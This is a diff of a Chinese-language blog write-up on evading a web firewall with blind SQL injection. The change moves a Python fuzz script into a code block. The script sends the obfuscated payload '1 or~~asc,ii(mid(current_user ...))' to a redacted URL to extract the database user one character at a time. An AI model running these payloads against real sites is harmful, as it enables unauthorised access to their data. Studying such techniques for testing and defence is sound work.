@@ -61,8 +61,10 @@ Select被拦
 <p><img src="https://i.imgur.com/eyDRkab.png" alt=""><br>Ascii也被拦了没关系，吃我逗号！</p>
 <p><img src="https://i.imgur.com/KEGv4ki.png" alt=""><br>看到502吓我一跳，后来发现真的时候是502，假的时候200</p>
 <p>Fuzz脚本</p>
-<p>import requests<br>url=’<a href="https://xxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;" target="_blank" rel="noopener">https://xxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;</a></p>
-<pre><code>for i in range(1,14):
+<pre><code>import requests
+url=&apos;https://xxxxxxxxxxxxxxxxxxxxxxxxxxx&apos;
+
+for i in range(1,14):
     for j in range(1,127):
         payload=&quot;1 or~~asc,ii(mid(current_user from %s for 1))=%s#&quot;%(i,j)
         data={&apos;captcha&apos;:&apos;1&apos;,
